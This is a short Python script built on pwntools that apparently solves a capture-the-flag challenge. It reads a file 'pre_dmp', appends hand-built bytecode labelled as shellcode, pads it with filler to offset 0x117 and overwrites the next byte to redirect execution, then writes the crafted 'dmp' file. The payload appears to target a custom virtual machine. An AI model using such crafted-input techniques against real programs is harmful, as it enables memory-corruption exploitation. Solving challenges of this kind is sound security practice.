from pwn import *

buf = open("pre_dmp").read()
f = open("dmp",'w')

sc = ""

#c0
sc += p8(3)
sc += p8(0x30)
sc += p8(0x31)

#c3
sc += p8(0xc1)
sc += p8(0xc0)
sc += p8(0x31)

#c6
sc += p8(0x40)
sc += p8(0xc1)
sc += p8(0xc0)

#c9
sc += p8(0xc2)
sc += p8(0xc1)
sc += p8(0xc0)

sc += "Z"*(0x117-len(sc))+p8(0xc9)

f.write(buf)
f.write(sc)
f.close()
